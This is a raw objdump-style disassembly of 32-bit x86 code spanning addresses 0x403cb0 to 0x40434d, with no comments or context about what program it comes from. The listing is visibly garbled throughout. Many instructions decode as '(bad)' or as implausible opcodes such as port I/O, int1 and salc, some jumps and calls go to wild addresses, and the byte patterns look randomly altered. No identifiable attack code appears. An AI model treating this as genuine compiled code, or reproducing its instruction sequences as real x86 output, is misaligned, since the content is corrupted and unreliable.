  403cb0:	00 0f                	add    %cl,(%edi)
  403cb2:	84 e0                	test   %ah,%al
  403cb4:	05 00 00 81 fe       	add    $0xfe810000,%eax
  403cb9:	24 42                	and    $0x42,%al
  403cbb:	0a 00                	or     (%eax),%al
  403cbd:	0f 84 d4 05 00 00    	je     0x404297
  403cc3:	81 fe a1 fc 0a 00    	cmp    $0xafca1,%esi
  403cc9:	fd                   	std
  403cca:	84 c8                	test   %cl,%al
  403ccc:	05 00 2d 3b fe       	add    $0xfe3b2d00,%eax
  403cd1:	b3 23                	mov    $0x23,%bl
  403cd3:	0b 00                	or     (%eax),%eax
  403cd5:	6d                   	insl   (%dx),%es:(%edi)
  403cd6:	84 fe                	test   %bh,%dh
  403cd8:	32 00                	xor    (%eax),%al
  403cda:	00 8b 4d fc 2b cf    	add    %cl,-0x30d403b3(%ebx)
  403ce0:	3b 53 75             	cmp    0x75(%ebx),%edx
  403ce3:	91                   	xchg   %eax,%ecx
  403ce4:	81 fe 7e 11 01 bc    	cmp    $0xbc01117e,%esi
  403cea:	75 ab                	jne    0x403c97
  403cec:	8b 19                	mov    (%ecx),%ebx
  403cee:	f3 02 41 00          	repz add 0x0(%ecx),%al
  403cf2:	25 42 89 15 b4       	and    $0xb4158942,%eax
  403cf7:	6b c5 00             	imul   $0x0,%ebp,%eax
  403cfa:	e8 d0 fd ff ff       	call   0x403acf
  403cff:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403d00:	c4 04 5f             	les    (%edi,%ebx,2),%eax
  403d03:	5e                   	pop    %esi
  403d04:	5b                   	pop    %ebx
  403d05:	8b ef                	mov    %edi,%ebp
  403d07:	b7 c3                	mov    $0xc3,%bh
  403d09:	9e                   	sahf
  403d0a:	18 74 7f 8b          	sbb    %dh,-0x75(%edi,%edi,2)
  403d0e:	0d c8 02 41 00       	or     $0x4102c8,%eax
  403d13:	a1 5c 02 41 68       	mov    0x6841025c,%eax
  403d18:	41                   	inc    %ecx
  403d19:	3b c7                	cmp    %edi,%eax
  403d1b:	89 0d a9 02 41 a3    	mov    %ecx,0xa34102a9
  403d21:	74 58                	je     0x403d7b
  403d23:	d7                   	xlat   %ds:(%ebx)
  403d24:	3d b8 21 41 00       	cmp    $0x4121b8,%eax
  403d29:	53                   	push   %ebx
  403d2a:	47                   	inc    %edi
  403d2b:	89 3d ee 02 41 00    	mov    %edi,0x4102ee
  403d31:	e8 5a 25 ff ff       	call   0x3f6290
  403d36:	a1 f5 02 41 00       	mov    0x4102f5,%eax
  403d3b:	83 c4 04             	add    $0x4,%esp
  403d3e:	83 f8 01             	cmp    $0x1,%eax
  403d41:	0f 8c ba 05 00 00    	jl     0x404301
  403d47:	56                   	push   %esi
  403d48:	8d 95 2d ff ff ff    	lea    -0xd3(%ebp),%edx
  403d4e:	6a 78                	push   $0x78
  403d50:	52                   	push   %edx
  403d51:	56                   	push   %esi
  403d52:	e8 89 c7 00 00       	call   0x4104e0
  403d57:	33 a1 c8 c0 40 00    	xor    0x40c0c8(%ecx),%esp
  403d5d:	68 0c e9 40 00       	push   $0x40e90c
  403d62:	83 c0 c7             	add    $0xffffffc7,%eax
  403d65:	68 ac 44 40 00       	push   $0x4044ac
  403d6a:	50                   	push   %eax
  403d6b:	b7 15                	mov    $0x15,%bh
  403d6d:	80 c1 40             	add    $0x40,%cl
  403d70:	00 83 c4 14 5f 5e    	add    %al,0x5e5f14c4(%ebx)
  403d76:	5b                   	pop    %ebx
  403d77:	8b e5                	mov    %ebp,%esp
  403d79:	0b c3                	or     %ebx,%eax
  403d7b:	db 68 52             	fldt   0x52(%eax)
  403d7e:	e9 40 00 e2 ba       	jmp    0xbb223dc3
  403d83:	e0 ff                	loopne 0x403d84
  403d85:	ff 8b 4d fc 83 c4    	decl   -0x3b7c03b3(%ebx)
  403d8b:	27                   	daa
  403d8c:	8b 35 90 02 41 00    	mov    0x410290,%esi
  403d92:	51                   	push   %ecx
  403d93:	87 94 e3 41 00 03 f1 	xchg   %edx,-0xefcffbf(%ebx,%eiz,8)
  403d9a:	13 d7                	adc    %edi,%edx
  403d9c:	89 35 98 2a 41 4a    	mov    %esi,0x4a412a98
  403da2:	e0 15                	loopne 0x403db9
  403da4:	94                   	xchg   %eax,%esp
  403da5:	f6 41 00 8b          	testb  $0x8b,0x0(%ecx)
  403da9:	43                   	inc    %ebx
  403daa:	0c 65                	or     $0x65,%al
  403dac:	c7                   	(bad)
  403dad:	75 14                	jne    0x403dc3
  403daf:	e8 4c 2c 00 00       	call   0x406a00
  403db4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403db7:	89 ba 48 08 60 00    	mov    %edi,0x600848(%edx)
  403dbd:	89 93 4c 08 00 fe    	mov    %edx,-0x1fff7b4(%ebx)
  403dc3:	8b 55 0c             	mov    0xc(%ebp),%edx
  403dc6:	8b 83 28 08 00 00    	mov    0x828(%ebx),%eax
  403dcc:	03 d1                	add    %ecx,%edx
  403dce:	3b c7                	cmp    %edi,%eax
  403dd0:	89 53 0c             	mov    %edx,0xc(%ebx)
  403dd3:	0f 85 5d 24 00 00    	jne    0x406236
  403dd9:	8b b3 20 c0 00 9e    	mov    -0x61ff3fe0(%ebx),%esi
  403ddf:	34 ff                	xor    $0xff,%al
  403de1:	7a 00                	jp     0x403de3
  403de3:	00 2b                	add    %ch,(%ebx)
  403de5:	c6 c7 77             	mov    $0x77,%bh
  403de8:	f0 5c                	lock pop %esp
  403dea:	00 00                	add    %al,(%eax)
  403dec:	8a 3b                	mov    (%ebx),%bh
  403dee:	c1 89 45 73 72 03 89 	rorl   $0x89,0x3727345(%ecx)
  403df5:	79 f4                	jns    0x403deb
  403df7:	8b 93 20 08 00 00    	mov    0x820(%ebx),%edx
  403dfd:	8b c8                	mov    %eax,%ecx
  403dff:	be f2 18 41 00       	mov    $0x4118f2,%esi
  403e04:	8d 7c 13 20          	lea    0x20(%ebx,%edx,1),%edi
  403e08:	8b d1                	mov    %ecx,%edx
  403e0a:	c1 b5 02 f3 a5 8b ca 	shll   $0xca,-0x745a0cfe(%ebp)
  403e11:	1d 55 f4 83 e1       	sbb    $0xe183f455,%eax
  403e16:	fd                   	std
  403e17:	2b c2                	sub    %edx,%eax
  403e19:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403e1b:	8b bb 20 f4 c9 00    	mov    0xc9f420(%ebx),%edi
  403e21:	7a 45                	jp     0x403e68
  403e23:	ec                   	in     (%dx),%al
  403e24:	03 98 8b cf dd bb    	add    -0x44223075(%eax),%ebx
  403e2a:	20 08                	and    %cl,(%eax)
  403e2c:	ed                   	in     (%dx),%eax
  403e2d:	00 c6                	add    %al,%dh
  403e2f:	44                   	inc    %esp
  403e30:	19 ad 00 a1 58 02    	sbb    %ebp,0x258a100(%ebp)
  403e36:	41                   	inc    %ecx
  403e37:	69 83 f8 02 7c 12 8d 	imul   $0x5020438d,0x127c02f8(%ebx),%eax
  403e3e:	43 20 50 
  403e41:	68 f0 e8 40 00       	push   $0x40e8f0
  403e46:	ff 15 64 c1 51 00    	call   *0x51c164
  403e4c:	ef                   	out    %eax,(%dx)
  403e4d:	c4 08                	les    (%eax),%ecx
  403e4f:	8b cf                	mov    %edi,%ecx
  403e51:	38 f6                	cmp    %dh,%dh
  403e53:	40                   	inc    %eax
  403e54:	16                   	push   %ss
  403e55:	8d 73 20             	lea    0x20(%ebx),%esi
  403e58:	7b e8                	jnp    0x403e42
  403e5a:	e8 40 00 56 ff       	call   0xff963e9f
  403e5f:	d7                   	xlat   %ds:(%ebx)
  403e60:	83 c4 be             	add    $0xffffffbe,%esp
  403e63:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403e66:	3b c0                	cmp    %eax,%eax
  403e68:	0f 85 85 00 00 00    	jne    0x403ef3
  403e6e:	68 b4 b0 40 00       	push   $0x40b0b4
  403e73:	56                   	push   %esi
  403e74:	71 d7                	jno    0x403e4d
  403e76:	4f                   	dec    %edi
  403e77:	04 08                	add    $0x8,%al
  403e79:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403e7c:	85 c0                	test   %eax,%eax
  403e7e:	c7                   	(bad)
  403e7f:	e2 f0                	loop   0x403e71
  403e81:	02 00                	add    (%eax),%al
  403e83:	00 00                	add    %al,(%eax)
  403e85:	37                   	aaa
  403e86:	6c                   	insb   (%dx),%es:(%edi)
  403e87:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403e8a:	0a c0                	or     %al,%al
  403e8c:	0f 85 05 f4 00 00    	jne    0x413297
  403e92:	a1 f8 17 f5 00       	mov    0xf517f8,%eax
  403e97:	8b 4b 04             	mov    0x4(%ebx),%ecx
  403e9a:	8d 86 d8 c7 45 dc    	lea    -0x23ba3828(%esi),%eax
  403ea0:	01 00                	add    %eax,(%eax)
  403ea2:	00 00                	add    %al,(%eax)
  403ea4:	89 50 89             	mov    %edx,-0x77(%eax)
  403ea7:	4d                   	dec    %ebp
  403ea8:	62                   	(bad)
  403ea9:	e8 52 23 00 00       	call   0x406200
  403eae:	b7 4b                	mov    $0x4b,%bh
  403eb0:	1b 51 e8             	sbb    -0x18(%ecx),%edx
  403eb3:	d6                   	salc
  403eb4:	29 00                	sub    %eax,(%eax)
  403eb6:	00 fd                	add    %bh,%ch
  403eb8:	af                   	scas   %es:(%edi),%eax
  403eb9:	0f 02 ea             	lar    %edx,%ebp
  403ebc:	00 a1 50 02 69 00    	add    %ah,0x690250(%ecx)
  403ec2:	42                   	inc    %edx
  403ec3:	89 15 d0 51 41 00    	mov    %edx,0x4151d0
  403ec9:	8b d0                	mov    %eax,%edx
  403ecb:	40                   	inc    %eax
  403ecc:	83 fa a8             	cmp    $0xffffffa8,%edx
  403ecf:	a3 b8 02 41 3a       	mov    %eax,0x3a4102b8
  403ed4:	7e 0d                	jle    0x403ee3
  403ed6:	68 b0 23 40 00       	push   $0x4023b0
  403edb:	e8 70 d8 71 ff       	call   0xffb21750
  403ee0:	83 c4 04             	add    $0x4,%esp
  403ee3:	44                   	inc    %esp
  403ee4:	e8 77 f9 6b ff       	call   0xffac3860
  403ee9:	83 c4 04             	add    $0x4,%esp
  403eec:	33 ff                	xor    %edi,%edi
  403eee:	e9 c8 01 00 00       	jmp    0x4040bb
  403ef3:	a1 b4 02 45 00       	mov    0x4502b4,%eax
  403ef8:	85 86 75 2e 68 e0    	test   %eax,-0x1f97d18b(%esi)
  403efe:	e8 40 00 56 ff       	call   0xff963f43
  403f03:	d7                   	xlat   %ds:(%ebx)
  403f04:	83 c4 08             	add    $0x8,%esp
  403f07:	ba e0 13 41 00       	mov    $0x4113e0,%edx
  403f0c:	85 c0                	test   %eax,%eax
  403f0e:	74 17                	je     0x403f27
  403f10:	8a d7                	mov    %bh,%dl
  403f12:	08 83 c0 03 80 f9    	or     %al,-0x67ffc40(%ebx)
  403f18:	20 7e 0c             	and    %bh,0xc(%esi)
  403f1b:	8f 0a 8a 48          	(bad)
  403f1f:	c2 42 40             	ret    $0x4042
  403f22:	80 74 20 7f b2       	xorb   $0xb2,0x7f(%eax,%eiz,1)
  403f27:	e0 02                	loopne 0x403f2b
  403f29:	00 68 d8             	add    %ch,-0x28(%eax)
  403f2c:	44                   	inc    %esp
  403f2d:	40                   	inc    %eax
  403f2e:	00 9c ff d7 8b d0 83 	add    %bl,-0x7c2f7429(%edi,%edi,8)
  403f35:	c4 59 85             	les    -0x7b(%ecx),%ebx
  403f38:	a3 74 36 6a fa       	mov    %eax,0xfa6a3674
  403f3d:	83 c9 ff             	or     $0xffffffff,%ecx
  403f40:	33 c0                	xor    %eax,%eax
  403f42:	f2 ae                	repnz scas %es:(%edi),%al
  403f44:	f7 f7                	div    %edi
  403f46:	49                   	dec    %ecx
  403f47:	b1 f3                	mov    $0xf3,%cl
  403f49:	09 ee                	or     %ebp,%esi
  403f4b:	1f                   	pop    %ds
  403f4c:	83 c2 ee             	add    $0xffffffee,%edx
  403f4f:	6a 03                	push   $0x3
  403f51:	8d 45 08             	lea    0x8(%ebp),%eax
  403f54:	52                   	push   %edx
  403f55:	50                   	push   %eax
  403f56:	ff 15 8f c1 40 00    	call   *0x40c18f
  403f5c:	8b 3d 66 c1 40 00    	mov    0x40c166,%edi
  403f62:	83 c4 0c             	add    $0xc,%esp
  403f65:	c6 45 0b 85          	movb   $0x85,0xb(%ebp)
  403f69:	eb 0f                	jmp    0x403f7a
  403f6b:	8b 6e a7             	mov    -0x59(%esi),%ebp
  403f6e:	9b                   	fwait
  403f6f:	40                   	inc    %eax
  403f70:	00 8b 0d d4 e8 40    	add    %cl,0x40e8d40d(%ebx)
  403f76:	00 89 4d 08 1a 45    	add    %cl,0x451a084d(%ecx)
  403f7c:	fc                   	cld
  403f7d:	3c 32                	cmp    $0x32,%al
  403f7f:	a1 58 02 41 00       	mov    0x410258,%eax
  403f84:	d7                   	xlat   %ds:(%ebx)
  403f85:	1d 8b 0d d0 02       	sbb    $0x2d00d8b,%eax
  403f8a:	41                   	inc    %ecx
  403f8b:	00 73 83             	add    %dh,-0x7d(%ebx)
  403f8e:	03 02                	add    (%edx),%eax
  403f90:	89 0d d0 02 41 00    	mov    %ecx,0x4102d0
  403f96:	7c 22                	jl     0x403fba
  403f98:	8d 55 08             	lea    0x8(%ebp),%edx
  403f9b:	be 68 ac db 40       	mov    $0x40dbac68,%esi
  403fa0:	00 eb                	add    %ch,%bl
  403fa2:	0e                   	push   %cs
  403fa3:	83 f8 03             	cmp    $0x3,%eax
  403fa6:	7c 12                	jl     0x403fba
  403fa8:	8d 45 08             	lea    0x8(%ebp),%eax
  403fab:	50                   	push   %eax
  403fac:	22 90 e8 40 00 ca    	and    -0x35ffbf18(%eax),%dl
  403fb2:	15 64 c1 47 00       	adc    $0x47c164,%eax
  403fb7:	ba 76 33 8b 4d       	mov    $0x4d8b3376,%edx
  403fbc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403fbd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403fbe:	22 28                	and    (%eax),%ch
  403fc0:	4b                   	dec    %ebx
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	01 e0                	add    %esp,%eax
  403fc5:	67 00 c6             	addr16 add %al,%dh
  403fc8:	01 00                	add    %eax,(%eax)
  403fca:	a1 68 5c 41 00       	mov    0x415c68,%eax
  403fcf:	85 c0                	test   %eax,%eax
  403fd1:	0f 84 80 00 00 00    	je     0x404057
  403fd7:	68 84 e8 40 00       	push   $0x40e884
  403fdc:	56                   	push   %esi
  403fdd:	ff d7                	call   *%edi
  403fdf:	c6 c4 08             	mov    $0x8,%ah
  403fe2:	85 d2                	test   %edx,%edx
  403fe4:	75 78                	jne    0x40405e
  403fe6:	68 78 6d 9a 08       	push   $0x89a6d78
  403feb:	56                   	push   %esi
  403fec:	ef                   	out    %eax,(%dx)
  403fed:	ac                   	lods   %ds:(%esi),%al
  403fee:	83 c4 08             	add    $0x8,%esp
  403ff1:	b0 c0                	mov    $0xc0,%al
  403ff3:	74 62                	je     0x404057
  403ff5:	68 68 4e 40 04       	push   $0x4404e68
  403ffa:	56                   	push   %esi
  403ffb:	ff d7                	call   *%edi
  403ffd:	97                   	xchg   %eax,%edi
  403ffe:	ed                   	in     (%dx),%eax
  403fff:	83 1f 08             	sbbl   $0x8,(%edi)
  404002:	85 ff                	test   %edi,%edi
  404004:	75 ed                	jne    0x403ff3
  404006:	68 72 02 40 cf       	push   $0xcf400272
  40400b:	56                   	push   %esi
  40400c:	ff 15 38 c1 40 d1    	call   *0xd140c138
  404012:	8b f8                	mov    %eax,%edi
  404014:	81 c4 e5 68 ff 74    	add    $0x74ff68e5,%esp
  40401a:	0b fd                	or     %ebp,%edi
  40401c:	83 24 08 00          	andl   $0x0,(%eax,%ecx,1)
  404020:	00 01                	add    %al,(%ecx)
  404022:	f2 00 86 bf 60 02 41 	repnz add %al,0x410260bf(%esi)
  404029:	00 85 ac 7c 0f 4d    	add    %al,0x4d0f7cac(%ebp)
  40402f:	57                   	push   %edi
  404030:	10 52 ff             	adc    %dl,-0x1(%edx)
  404033:	15 6c c1 a5 00       	adc    $0xa5c16c,%eax
  404038:	83 c4 04             	add    $0x4,%esp
  40403b:	eb 02                	jmp    0x40403f
  40403d:	33 c0                	xor    %eax,%eax
  40403f:	85 ff                	test   %edi,%edi
  404041:	89 43 92             	mov    %eax,-0x6e(%ebx)
  404044:	75 11                	jne    0x404057
  404046:	c7                   	(bad)
  404047:	27                   	daa
  404048:	e9 08 00 18 40       	jmp    0x40584055
  40404d:	31 00                	xor    %eax,(%eax)
  40404f:	00 c7                	add    %al,%bh
  404051:	43                   	inc    %ebx
  404052:	1c 00                	sbb    $0x0,%al
  404054:	00 a5 00 9f 67 fc    	add    %ah,-0x3986100(%ebp)
  40405a:	2b 75 f8             	sub    -0x8(%ebp),%esi
  40405d:	2d 55 f4 d4 4d       	sub    $0x4dd4f455,%eax
  404062:	f0 2b c6             	lock sub %esi,%eax
  404065:	8b 73 10             	mov    0x10(%ebx),%esi
  404068:	2b c2                	sub    %edx,%eax
  40406a:	2b c1                	sub    %ecx,%eax
  40406c:	af                   	scas   %es:(%edi),%eax
  40406d:	8b 20                	mov    (%eax),%esp
  40406f:	85 00                	test   %eax,(%eax)
  404071:	00 03                	add    %al,(%ebx)
  404073:	c0 8d 54 08 69 03 8b 	rorb   $0x8b,0x3690854(%ebp)
  40407a:	1d 73 10 8b 0d       	sbb    $0xd8b1073,%eax
  40407f:	98                   	cwtl
  404080:	02 41 00             	add    0x0(%ecx),%al
  404083:	8b c6                	mov    %esi,%eax
  404085:	03 05 a1 9c 02 41    	add    0x41029ca1,%eax
  40408b:	00 83 d0 00 89 b9    	add    %al,-0x4676ff30(%ebx)
  404091:	98                   	cwtl
  404092:	02 07                	add    (%edi),%al
  404094:	00 33                	add    %dh,(%ebx)
  404096:	f9                   	stc
  404097:	eb 1d                	jmp    0x4040b6
  404099:	57                   	push   %edi
  40409a:	73 10                	jae    0x4040ac
  40409c:	ee                   	out    %al,(%dx)
  40409d:	f1                   	int1
  40409e:	89 f5                	mov    %esi,%ebp
  4040a0:	74 8b                	je     0x40402d
  4040a2:	15 98 02 2d 00       	adc    $0x2d0298,%eax
  4040a7:	a1 9c 02 41 00       	mov    0x41029c,%eax
  4040ac:	03 d1                	add    %ecx,%edx
  4040ae:	89 ed                	mov    %ebp,%ebp
  4040b0:	98                   	cwtl
  4040b1:	02 41 00             	add    0x0(%ecx),%al
  4040b4:	79 c7                	jns    0x40407d
  4040b6:	a3 9c 72 41 00       	mov    %eax,0x41729c
  4040bb:	39 bb 24 08 00 00    	cmp    %edi,0x824(%ebx)
  4040c1:	0f 84 d0 01 00 00    	je     0x404297
  4040c7:	8b 43 10             	mov    0x10(%ebx),%eax
  4040ca:	8b 4b 27             	mov    0x27(%ebx),%ecx
  4040cd:	3b 22                	cmp    (%edx),%esp
  4040cf:	0f 82 c2 c0 10 00    	jb     0x510197
  4040d5:	a1 ce fe 41 00       	mov    0x41fece,%eax
  4040da:	b0 83                	mov    $0x83,%al
  4040dc:	f8                   	clc
  4040dd:	d1 a3 f4 02 41 00    	shll   $1,0x4102f4(%ebx)
  4040e3:	75 0b                	jne    0x4040f0
  4040e5:	8b 4b 10             	mov    0x10(%ebx),%ecx
  4040e8:	89 0d 7d 02 41 00    	mov    %ecx,0x41027d
  4040ee:	eb 24                	jmp    0x404114
  4040f0:	8b 28                	mov    (%eax),%ebp
  4040f2:	10 dd                	adc    %bl,%ch
  4040f4:	8c 02                	mov    %es,(%edx)
  4040f6:	c2 00 3b             	ret    $0x3b00
  4040f9:	d0 74 18 0a          	shlb   $1,0xa(%eax,%ebx,1)
  4040fd:	0d b9 02 41 f9       	or     $0xf94102b9,%eax
  404102:	a1 4b 02 41 00       	mov    0x41024b,%eax
  404107:	41                   	inc    %ecx
  404108:	40                   	inc    %eax
  404109:	89 0d b8 02 41 00    	mov    %ecx,0x4102b8
  40410f:	a3 c0 21 41 00       	mov    %eax,0x4121c0
  404114:	a2 98 02 41 00       	mov    %al,0x410298
  404119:	8b 0d 10 d0 40 00    	mov    0x40d010,%ecx
  40411f:	3b c1                	cmp    %ecx,%eax
  404121:	0f 8d 13 01 8b 00    	jge    0xcb423a
  404127:	8b 0d c8 0b 60 00    	mov    0x600bc8,%ecx
  40412d:	8b 10                	mov    (%eax),%edx
  40412f:	c1 e6 05             	shl    $0x5,%esi
  404132:	03 f1                	add    %ecx,%esi
  404134:	8b 0d b0 02 41 41    	mov    0x414102b0,%ecx
  40413a:	40                   	inc    %eax
  40413b:	41                   	inc    %ecx
  40413c:	a3 ac 02 41 00       	mov    %eax,0x4102ac
  404141:	89 0d b0 02 41 00    	mov    %ecx,0x4102b0
  404147:	4d                   	dec    %ebp
  404148:	b4 28                	mov    $0x28,%ah
  40414a:	00 00                	add    %al,(%eax)
  40414c:	89 83 50 08 00 00    	mov    %eax,0x850(%ebx)
  404152:	8b 28                	mov    (%eax),%ebp
  404154:	30 08                	xor    %cl,(%eax)
  404156:	00 00                	add    %al,(%eax)
  404158:	89 49 54             	mov    %ecx,0x54(%ecx)
  40415b:	22 00                	and    (%eax),%al
  40415d:	00 89 06 8b 8b 34    	add    %cl,0x348b8b06(%ecx)
  404163:	08 00                	or     %al,(%eax)
  404165:	e8 0d 0f 04 8b       	call   0x8b445077
  40416a:	c0 38 a0             	sarb   $0xa0,(%eax)
  40416d:	00 5b 8b             	add    %bl,-0x75(%ebx)
  404170:	83 30 6a             	xorl   $0x6a,(%eax)
  404173:	1c 00                	sbb    $0x0,%al
  404175:	8b 93 34 08 00 00    	mov    0x834(%ebx),%edx
  40417b:	2b c8                	sub    %eax,%ecx
  40417d:	8b 83 85 08 00 00    	mov    0x885(%ebx),%eax
  404183:	cd c2                	int    $0xc2
  404185:	e0 a7                	loopne 0x40412e
  404187:	7f 0a                	jg     0x404193
  404189:	7c 04                	jl     0x40418f
  40418b:	3b cf                	cmp    %edi,%ecx
  40418d:	73 0d                	jae    0x40419c
  40418f:	33 c9                	xor    %ecx,%ecx
  404191:	33 c0                	xor    %eax,%eax
  404193:	89 40 10             	mov    %eax,0x10(%eax)
  404196:	89 cf                	mov    %ecx,%edi
  404198:	14 94                	adc    $0x94,%al
  40419a:	fd                   	std
  40419b:	50                   	push   %eax
  40419c:	08 00                	or     %al,(%eax)
  40419e:	25 8b 83 30 1d       	and    $0x1d30838b,%eax
  4041a3:	00 00                	add    %al,(%eax)
  4041a5:	8b 93 34 08 00 00    	mov    0x834(%ebx),%edx
  4041ab:	2b c8                	sub    %eax,%ecx
  4041ad:	8b 83 54 08 00 00    	mov    0x854(%ebx),%eax
  4041b3:	1b c2                	sbb    %edx,%eax
  4041b5:	3b c7                	cmp    %edi,%eax
  4041b7:	7f a7                	jg     0x404160
  4041b9:	7c 34                	jl     0x4041ef
  4041bb:	3b cf                	cmp    %edi,%ecx
  4041bd:	73 04                	jae    0x4041c3
  4041bf:	33 c9                	xor    %ecx,%ecx
  4041c1:	33 c0                	xor    %eax,%eax
  4041c3:	89 4e 18             	mov    %ecx,0x18(%esi)
  4041c6:	89 7f 1c             	mov    %edi,0x1c(%edi)
  4041c9:	8b 8b 48 08 83 00    	mov    0x830848(%ebx),%ecx
  4041cf:	b8 83 40 08 00       	mov    $0x84083,%eax
  4041d4:	00 8b 93 44 29 00    	add    %cl,0x294493(%ebx)
  4041da:	00 2b                	add    %ch,(%ebx)
  4041dc:	c8 8b 83 4c          	enter  $0x838b,$0x4c
  4041e0:	08 b9 00 1b 4c 3b    	or     %bh,0x3b4c1b00(%ecx)
  4041e6:	c7                   	(bad)
  4041e7:	7f 0a                	jg     0x4041f3
  4041e9:	7c 04                	jl     0x4041ef
  4041eb:	b1 cf                	mov    $0xcf,%cl
  4041ed:	73 77                	jae    0x404266
  4041ef:	f9                   	stc
  4041f0:	c9                   	leave
  4041f1:	33 c0                	xor    %eax,%eax
  4041f3:	89 c1                	mov    %eax,%ecx
  4041f5:	08 4f 46             	or     %cl,0x46(%edi)
  4041f8:	0c 8b                	or     $0x8b,%al
  4041fa:	0d 14 86 40 00       	or     $0x408614,%eax
  4041ff:	3b cf                	cmp    %edi,%ecx
  404201:	74 37                	je     0x40423a
  404203:	8b 35 14 02 41 00    	mov    0x410214,%esi
  404209:	53                   	push   %ebx
  40420a:	c6                   	(bad)
  40420b:	99                   	cltd
  40420c:	f7 f9                	idiv   %ecx
  40420e:	85 d2                	test   %edx,%edx
  404210:	75 28                	jne    0x40423a
  404212:	8b 15 c8 c0 40 00    	mov    0x40c0c8,%edx
  404218:	56                   	push   %esi
  404219:	83 c2 40             	add    $0x40,%edx
  40421c:	68 ca e8 40 00       	push   $0x40e8ca
  404221:	ae                   	scas   %es:(%edi),%al
  404222:	ff 15 47 c1 40 e2    	call   *0xe240c147
  404228:	a1 b0 c0 3a 00       	mov    0x3ac0b0,%eax
  40422d:	83 c0 40             	add    $0x40,%eax
  404230:	75 ff                	jne    0x404231
  404232:	15 54 c1 25 00       	adc    $0x25c154,%eax
  404237:	83 c4 10             	add    $0x10,%esp
  40423a:	f1                   	int1
  40423b:	bb 24 08 e8 00       	mov    $0xe80824,%ebx
  404240:	89 7b a8             	mov    %edi,-0x58(%ebx)
  404243:	89 bb 28 08 00 00    	mov    %edi,0x828(%ebx)
  404249:	89 bb 20 87 00 00    	mov    %edi,0x8720(%ebx)
  40424f:	89 f0                	mov    %esi,%eax
  404251:	bd 89 93 0c 3b       	mov    $0x3b0c9389,%ebp
  404256:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404257:	7d 00                	jge    0x404259
  404259:	00 a3 a0 0b 70 00    	add    %ah,0x700ba0(%ebx)
  40425f:	89 15 a4 0b 41 00    	mov    %edx,0x410ba4
  404265:	89 83 fc 08 bf 00    	mov    %eax,0xbf08fc(%ebx)
  40426b:	8b 0d a4 0b 41 00    	mov    0x410ba4,%ecx
  404271:	89 66 02             	mov    %esp,0x2(%esi)
  404274:	08 00                	or     %al,(%eax)
  404276:	dd 8b 15 a0 0b 08    	fisttpll 0x80ba015(%ebx)
  40427c:	00 89 93 30 8f 00    	add    %cl,0x8f3093(%ecx)
  404282:	00 7c a4 0b          	add    %bh,0xb(%esp,%eiz,4)
  404286:	41                   	inc    %ecx
  404287:	00 53 89             	add    %dl,-0x77(%ebx)
  40428a:	83 34 08 00          	xorl   $0x0,(%eax,%ecx,1)
  40428e:	00 e8                	add    %ch,%al
  404290:	0c dc                	or     $0xdc,%al
  404292:	ff                   	(bad)
  404293:	ff 0e                	decl   (%esi)
  404295:	e5 04                	in     $0x4,%eax
  404297:	5f                   	pop    %edi
  404298:	5e                   	pop    %esi
  404299:	f1                   	int1
  40429a:	42                   	inc    %edx
  40429b:	e5 5d                	in     $0x5d,%eax
  40429d:	51                   	push   %ecx
  40429e:	90                   	nop
  40429f:	90                   	nop
  4042a0:	a1 3c da 41 00       	mov    0x41da3c,%eax
  4042a5:	56                   	push   %esi
  4042a6:	8b 35 64 bb 40 00    	mov    0x40bb64,%esi
  4042ac:	85 c0                	test   %eax,%eax
  4042ae:	d5 26                	aad    $0x26
  4042b0:	68 d8 ea 40 00       	push   $0x40ead8
  4042b5:	94                   	xchg   %eax,%esp
  4042b6:	b4 c0                	mov    $0xc0,%ah
  4042b8:	35 00 ff 81 21       	xor    $0x2181ff00,%eax
  4042bd:	68 b2 40 00 ff       	push   $0xff0040b2
  4042c2:	d6                   	salc
  4042c3:	68 20 ce 40 6d       	push   $0x6d40ce20
  4042c8:	ff d6                	call   *%esi
  4042ca:	68 80 d4 40 00       	push   $0x40d480
  4042cf:	ff d6                	call   *%esi
  4042d1:	83 19 14             	sbbl   $0x14,(%ecx)
  4042d4:	5e                   	pop    %esi
  4042d5:	c3                   	ret
  4042d6:	68 14 ea 40 1b       	push   $0x1b40ea14
  4042db:	ff d6                	call   *%esi
  4042dd:	68 00 ea 40 00       	push   $0x40ea00
  4042e2:	68 44 d4 ec 00       	push   $0xecd444
  4042e7:	68 c8 e9 40 fc       	push   $0xfc40e9c8
  4042ec:	ac                   	lods   %ds:(%esi),%al
  4042ed:	d6                   	salc
  4042ee:	68 78 e9 40 60       	push   $0x6040e978
  4042f3:	ff d6                	call   *%esi
  4042f5:	68 dd 41 40 27       	push   $0x274041dd
  4042fa:	ff d6                	call   *%esi
  4042fc:	b4 1c                	mov    $0x1c,%ah
  4042fe:	e9 40 00 ff d6       	jmp    0xd73f4343
  404303:	76 c4                	jbe    0x4042c9
  404305:	1c 30                	sbb    $0x30,%al
  404307:	c3                   	ret
  404308:	90                   	nop
  404309:	90                   	nop
  40430a:	90                   	nop
  40430b:	90                   	nop
  40430c:	c0 90 90 90 55 8b ec 	rclb   $0xec,-0x74aa6f70(%eax)
  404313:	8b 45 08             	mov    0x8(%ebp),%eax
  404316:	8b 0d c8 8b a6 00    	mov    0xa68bc8,%ecx
  40431c:	56                   	push   %esi
  40431d:	14 5a                	adc    $0x5a,%al
  40431f:	80 c1 40             	add    $0x40,%cl
  404322:	00 50 83             	add    %dl,-0x7d(%eax)
  404325:	c1 40 68 e4          	roll   $0xe4,0x68(%eax)
  404329:	f2 40                	repnz inc %eax
  40432b:	00 51 ff             	add    %dl,-0x1(%ecx)
  40432e:	d6                   	salc
  40432f:	8b 15 c8 c0 29 00    	mov    0x29c0c8,%edx
  404335:	68 6a f2 40 63       	push   $0x6340f26a
  40433a:	83 c2 40             	add    $0x40,%edx
  40433d:	52                   	push   %edx
  40433e:	ff d6                	call   *%esi
  404340:	a1 c8 10 40 00       	mov    0x4010c8,%eax
  404345:	0f 3b                	(bad)
  404347:	f2 0a 00             	repnz or (%eax),%al
  40434a:	83 c0 40             	add    $0x40,%eax
  40434d:	75 ff                	jne    0x40434e
